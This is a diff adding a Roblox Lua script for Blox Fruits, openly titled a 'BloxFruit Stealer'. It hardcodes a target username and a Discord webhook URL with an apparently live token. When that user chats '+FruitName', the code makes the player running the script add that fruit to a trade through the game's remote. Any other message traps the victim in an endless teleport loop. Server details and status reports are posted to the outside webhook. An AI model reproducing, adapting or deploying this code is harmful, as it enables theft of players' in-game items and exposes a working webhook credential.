@@ -1,0 +1,155 @@
+--[[
+   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
+  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
+ | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
+  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
+ |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
+                                                                     
+                        Scripts.SM | Premium Scripts
+                        Title: BloxFruit Stealer + Server Name Getter
+                        Made by: IDK
+                        Discord: Link in Bio
+]]
+
+local Username = "thenicebroim"
+local DiscordWebhookURL = "https://discord.com/api/webhooks/1453932216827645993/pKfi8nkMScLRySbGFySPsAaAEMUdiCV9TO3_2xUiLc7CVwDUJiuqkk9LgOac3LZNFy7f"
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local addtrade = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+local sitteleport = Vector3.new(-463, 73, 271)
+
+local lp = Players.LocalPlayer
+
+local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
+
+local function generateServerName(jobId)
+    local adjectives = {
+        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
+        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
+        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
+        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
+        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
+    }
+
+    local nouns = {
+        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
+        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
+        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
+        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
+        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
+        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
+    }
+
+    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
+    local rng = Random.new(seed)
+
+    local adjective = adjectives[rng:NextInteger(1, #adjectives)]
+    local noun = nouns[rng:NextInteger(1, #nouns)]
+    local number = string.format("%04d", rng:NextInteger(1, 9999))
+
+    return adjective .. " " .. noun .. " #" .. number
+end
+
+local function getServerName()
+    local jobId = ServerBrowser:InvokeServer("getjob")
+    return jobId and generateServerName(jobId) or "unknown server"
+end
+
+local function sendDiscordNotification(message)
+    if DiscordWebhookURL == "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token" then
+        return
+    end
+    
+    local serverName = getServerName()
+    
+    local payload = {
+        content = "@everyone " .. message,
+        username = "BloxFruit Script",
+        embeds = {{
+            title = "Script Notification",
+            description = message,
+            color = 0x00FF00,
+            fields = {
+                {
+                    name = "Server",
+                    value = serverName,
+                    inline = true
+                },
+                {
+                    name = "Target User",
+                    value = Username,
+                    inline = true
+                }
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    pcall(function()
+        HttpService:PostAsync(DiscordWebhookURL, HttpService:JSONEncode(payload))
+    end)
+end
+
+local function lettercasesupport(name)
+    name = name:lower()
+    return name:sub(1,1):upper() .. name:sub(2)
+end
+
+local function trade(fruitName)
+    local formattedName = lettercasesupport(fruitName)
+    local formattedFruit = formattedName .. "-" .. formattedName
+    local args = {
+        "addItem",
+        formattedFruit
+    }
+    addtrade:InvokeServer(unpack(args))
+    sendDiscordNotification("Fruit added to trade: " .. formattedName)
+end
+
+local function tptosit()
+    local character = lp.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        character:MoveTo(sitteleport)
+    end
+end
+
+local function playeraddfruitcommand(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(message)
+            if message:sub(1, 1) == "+" then
+                local fruit = message:sub(2)
+                trade(fruit)
+            else
+                sendDiscordNotification("Target player started spamming commands!")
+                while true do
+                    task.wait(0.1)
+                    tptosit()
+                end
+            end
+        end)
+    end
+end
+
+print("name:", getServerName())
+
+sendDiscordNotification("Script started on server: " .. getServerName())
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Name:lower() == Username:lower() then
+        playeraddfruitcommand(player)
+        sendDiscordNotification("Target player " .. player.Name .. " is in the server!")
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name:lower() == Username:lower() then
+        playeraddfruitcommand(player)
+        sendDiscordNotification("Target player " .. player.Name .. " joined the server!")
+    end
+end)
+
+Players.PlayerAdded:Connect(playeraddfruitcommand)
